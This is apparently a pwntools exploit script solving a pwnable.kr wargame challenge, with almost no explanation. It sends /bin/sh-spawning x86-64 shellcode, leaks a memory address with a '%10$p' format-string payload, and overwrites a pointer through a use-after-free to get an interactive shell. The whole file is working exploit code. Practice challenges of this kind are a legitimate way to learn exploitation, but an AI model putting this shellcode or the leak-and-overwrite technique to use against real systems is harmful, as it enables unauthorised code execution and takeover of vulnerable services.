from pwn import *

fsb_payload = "%10$p"
# shellcode from www.exploit-db.com
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
sh = remote("pwnable.kr", 9011)
sh.recvuntil(": ")
sh.sendline(shellcode)
sh.recvuntil("> ")
sh.sendline("2")
sh.recvline()
sh.sendline(fsb_payload)
leak_addr = sh.recvline().strip()
greetings_addr = int(leak_addr, 16) - 0x20
sh.recvuntil("> ")
sh.sendline("4")
sh.sendline("n")  # don't exit
sh.recvuntil("> ")
sh.sendline("3")
sh.recvline()
sh.sendline("\x90" * 24 + p64(greetings_addr))
sh.interactive()

# fun_with_UAF_and_FSB :)
